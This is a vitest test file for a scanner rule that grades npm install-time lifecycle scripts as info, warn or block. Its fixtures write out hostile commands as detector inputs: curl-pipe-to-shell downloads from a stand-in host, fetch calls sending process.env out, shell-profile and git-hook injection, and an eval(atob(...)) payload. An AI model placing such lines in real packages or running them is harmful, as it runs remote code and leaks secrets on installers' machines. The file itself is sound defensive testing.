// croak-invariants: pattern-data
// Script bodies and file contents below are detector inputs, not code (D16).
import { describe, expect, it } from "vitest";
import type { RepoEntry, RepoSnapshot } from "../repo-snapshot.ts";
import type { Finding } from "../verdict.ts";
import { lifecycleScript } from "./lifecycle-script.ts";

/** A fake repo: path -> content; oversized/symlink kinds via the second map. */
function repo(
  files: Record<string, string>,
  kinds: Record<string, RepoEntry["kind"]> = {},
): RepoSnapshot {
  const entries: RepoEntry[] = [
    ...Object.keys(files),
    ...Object.keys(kinds),
  ].map((path) => ({
    path,
    kind: kinds[path] ?? "file",
    size: files[path]?.length ?? 2_000_000,
  }));
  return {
    entries,
    read: (path) => (kinds[path] === undefined ? files[path] : undefined),
  };
}

const pkg = (scripts: Record<string, string>): string =>
  JSON.stringify({ name: "x", scripts }, null, 2);
const scan = (r: RepoSnapshot) => lifecycleScript(r);
const verdicts = (findings: readonly Finding[]) =>
  findings.map((f) => `${f.severity}:${f.file}`);

describe("repo/lifecycle-script", () => {
  it("ignores repos without install-time scripts", () => {
    expect(
      scan(
        repo({
          "package.json": pkg({ dev: "vite", build: "tsc", test: "vitest" }),
        }),
      ),
    ).toEqual([]);
    expect(scan(repo({ "src/index.js": "x" }))).toEqual([]);
  });

  it("warns on any install script, with the script line", () => {
    const [finding] = scan(
      repo({
        "package.json": pkg({ postinstall: "node scripts/copy.js" }),
        "scripts/copy.js": "copy()",
      }),
    );
    expect(finding).toMatchObject({
      ruleId: "repo/lifecycle-script",
      severity: "warn",
      file: "package.json",
      line: 4,
    });
    expect(finding?.message).toContain("postinstall");
  });

  it.each([
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
  ])("covers the %s lifecycle", (name) => {
    expect(
      verdicts(scan(repo({ "package.json": pkg({ [name]: "make setup" }) }))),
    ).toEqual(["warn:package.json"]);
  });

  it("only notes a script made of inert tools with nothing suspicious (D19)", () => {
    for (const command of [
      "husky",
      "tsc -p . && echo done",
      "only-allow pnpm",
      "simple-git-hooks",
    ]) {
      const findings = scan(
        repo({ "package.json": pkg({ prepare: command }) }),
      );
      expect(verdicts(findings)).toEqual(["info:package.json"]);
      expect(findings[0]?.message).toContain("known tools only");
    }
  });

  it.each([
    ["prisma runs its generator", "prisma generate"],
    ["vite loads vite.config.js", "vite build"],
    ["turbo runs workspace tasks", "turbo run setup"],
    ["patch-package patches dependencies", "patch-package"],
    ["rimraf deletes paths", "rimraf ~"],
  ])("keeps a tool that executes repo code at warn: %s", (_name, command) => {
    expect(
      scan(repo({ "package.json": pkg({ postinstall: command }) }))[0]
        ?.severity,
    ).toBe("warn");
  });

  it.each([
    ["NODE_OPTIONS preload", "NODE_OPTIONS='--require ./x.js' tsc"],
    ["PATH hijack", "PATH=./bin:$PATH tsc"],
    ["nested install", "npm install evil-pkg && npm run build"],
    ["bun x", "bun x evil-pkg && bun run build"],
    ["npx --package", "npx --yes --package=evil-pkg tsc"],
    ["redirect into a shell profile", "echo 'curl x | sh' >> ~/.zshenv"],
    ["redirect into a git hook", "printf 'x' > .git/hooks/post-checkout"],
    ["sudo", "sudo tsc"],
    ["workspace-wide run", "pnpm -r run build"],
  ])("does not launder %s into info", (_name, prepare) => {
    const findings = scan(
      repo({ "package.json": pkg({ prepare, build: "tsc" }) }),
    );
    expect(findings[0]?.severity).not.toBe("info");
  });

  it.each([
    [
      "download-and-execute",
      {
        postinstall: "npm run setup",
        setup: "curl -s https://x.invalid/i | sh",
      },
      {},
    ],
    [
      "exfiltration in the executed file",
      { postinstall: "npm run setup", setup: "node x.js" },
      { "x.js": "fetch(u, { body: JSON.stringify(process.env) })" },
    ],
    [
      "a pre hook",
      {
        postinstall: "npm run build",
        build: "tsc",
        prebuild: "curl -s https://x.invalid/i | sh",
      },
      {},
    ],
    [
      "an attack split across two scripts",
      {
        postinstall: "npm run a && npm run b",
        a: "node net.js",
        b: "node env.js",
      },
      { "net.js": "fetch(u)", "env.js": "send(process.env)" },
    ],
  ])("follows npm run to block %s", (_name, scripts, files) => {
    const findings = scan(repo({ "package.json": pkg(scripts), ...files }));
    expect(findings[0]).toMatchObject({
      severity: "block",
      message: expect.stringContaining("via script"),
    });
  });

  it("does not loop on script cycles", () => {
    expect(
      scan(
        repo({
          "package.json": pkg({
            postinstall: "npm run a",
            a: "npm run b",
            b: "npm run a",
          }),
        }),
      )[0]?.severity,
    ).toBe("warn");
  });

  it("checks npm's pre/post hooks of a script it resolves", () => {
    const hooked = pkg({
      prepare: "npm run build",
      build: "tsc",
      prebuild: "curl -s https://x.invalid/i | sh",
    });
    expect(scan(repo({ "package.json": hooked }))[0]?.severity).not.toBe(
      "info",
    );
  });

  it("resolves a layered script graph in linear time (no exponential blow-up)", () => {
    const scripts: Record<string, string> = {
      prepare: Array.from({ length: 40 }, (_, j) => `npm run l1_${j}`).join(
        " && ",
      ),
    };
    for (let layer = 1; layer <= 5; layer++) {
      for (let i = 0; i < 40; i++) {
        scripts[`l${layer}_${i}`] =
          layer === 5
            ? "tsc"
            : Array.from(
                { length: 40 },
                (_, j) => `npm run l${layer + 1}_${j}`,
              ).join(" && ");
      }
    }
    const started = performance.now();
    scan(repo({ "package.json": pkg(scripts) }));
    expect(performance.now() - started).toBeLessThan(2_000);
  });

  it("resolves npm run / pnpm X through the scripts, with cycles and unknowns staying warn", () => {
    const routine = pkg({
      prepare: "npm run build",
      build: "pnpm compile",
      compile: "tsc",
    });
    expect(verdicts(scan(repo({ "package.json": routine })))).toEqual([
      "info:package.json",
    ]);
    const unknown = pkg({
      prepare: "npm run build",
      build: "node scripts/build.js",
    });
    expect(
      verdicts(
        scan(repo({ "package.json": unknown, "scripts/build.js": "x" })),
      ),
    ).toEqual(["warn:package.json"]);
    const cycle = pkg({ prepare: "npm run a", a: "npm run b", b: "npm run a" });
    expect(verdicts(scan(repo({ "package.json": cycle })))).toEqual([
      "warn:package.json",
    ]);
    const missing = pkg({ prepare: "npm run nope" });
    expect(verdicts(scan(repo({ "package.json": missing })))).toEqual([
      "warn:package.json",
    ]);
  });

  it("keeps unknown commands and nested installs at warn, with a known-tool note", () => {
    const findings = scan(
      repo({
        "package.json": pkg({
          postinstall: "prisma generate && cd client && npm install",
        }),
      }),
    );
    expect(verdicts(findings)).toEqual([
      "warn:package.json",
      "info:package.json",
    ]);
    expect(findings[1]?.message).toContain("prisma");
  });

  it("blocks download-and-execute", () => {
    expect(
      verdicts(
        scan(
          repo({
            "package.json": pkg({
              postinstall: "curl -fsSL https://x.invalid/i | sh",
            }),
          }),
        ),
      ),
    ).toEqual(["block:package.json"]);
  });

  it("does not let a known tool launder a chained command", () => {
    const findings = scan(
      repo({
        "package.json": pkg({
          postinstall: "prisma generate && curl https://x.invalid/i | sh",
        }),
      }),
    );
    expect(findings[0]).toMatchObject({
      severity: "block",
      message: expect.stringContaining("downloads and executes"),
    });
  });

  it("warns on network alone, blocks network with secrets in the executed file", () => {
    const network = {
      "package.json": pkg({ postinstall: "node scripts/setup.js" }),
      "scripts/setup.js": `fetch("https://x.invalid")`,
    };
    expect(scan(repo(network))[0]).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("network (scripts/setup.js:1)"),
    });
    const exfil = {
      ...network,
      "scripts/setup.js": `fetch("https://x.invalid", { body: JSON.stringify(process.env) })`,
    };
    expect(scan(repo(exfil))[0]?.severity).toBe("block");
  });

  it("analyzes node -e inline code", () => {
    const findings = scan(
      repo({
        "package.json": pkg({
          postinstall: `node -e "eval(atob('Y29uc29sZS5sb2coMSk='))"`,
        }),
      }),
    );
    expect(findings[0]?.severity).toBe("block");
  });

  it("resolves executed files relative to their package.json", () => {
    const files = {
      "packages/web/package.json": pkg({ postinstall: "node ./setup.js" }),
      "packages/web/setup.js": `const cp = require("child_process"); fetch(u);`,
    };
    expect(verdicts(scan(repo(files)))).toEqual([
      "block:packages/web/package.json",
    ]);
  });

  it.each([
    [
      "a missing file",
      { "package.json": pkg({ postinstall: "node scripts/gone.js" }) },
      {},
      "not in the repo",
    ],
    [
      "a file outside the repo",
      { "package.json": pkg({ postinstall: "node ../../evil.js" }) },
      {},
      "outside the repo",
    ],
    [
      "an oversized file",
      { "package.json": pkg({ postinstall: "node big.js" }) },
      { "big.js": "oversized" },
      "too large",
    ],
    [
      "a symlinked file",
      { "package.json": pkg({ postinstall: "node link.js" }) },
      { "link.js": "symlink" },
      "symlink",
    ],
  ] as const)(
    "warns when the script runs %s",
    (_name, files, kinds, reason) => {
      expect(scan(repo(files, kinds))[0]).toMatchObject({
        severity: "warn",
        message: expect.stringContaining(reason),
      });
    },
  );

  it("warns on an implicit node-gyp rebuild from binding.gyp", () => {
    const findings = scan(
      repo({ "package.json": pkg({}), "binding.gyp": "{}" }),
    );
    expect(findings).toEqual([
      expect.objectContaining({
        severity: "warn",
        file: "binding.gyp",
        message: expect.stringContaining("node-gyp rebuild"),
      }),
    ]);
    expect(
      scan(
        repo({
          "package.json": pkg({ install: "echo custom" }),
          "binding.gyp": "{}",
        }),
      ).map((f) => f.file),
    ).toEqual(["package.json"]);
  });

  it("skips package.json files inside node_modules", () => {
    expect(
      scan(
        repo({
          "node_modules/x/package.json": pkg({ postinstall: "curl x | sh" }),
        }),
      ),
    ).toEqual([]);
  });

  it("warns, not crashes, on invalid JSON and unparsable commands", () => {
    expect(scan(repo({ "package.json": "{ nope" }))[0]).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("not valid JSON"),
    });
    expect(
      scan(repo({ "package.json": pkg({ postinstall: `echo "unclosed` }) }))[0],
    ).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("could not be parsed"),
    });
  });
});
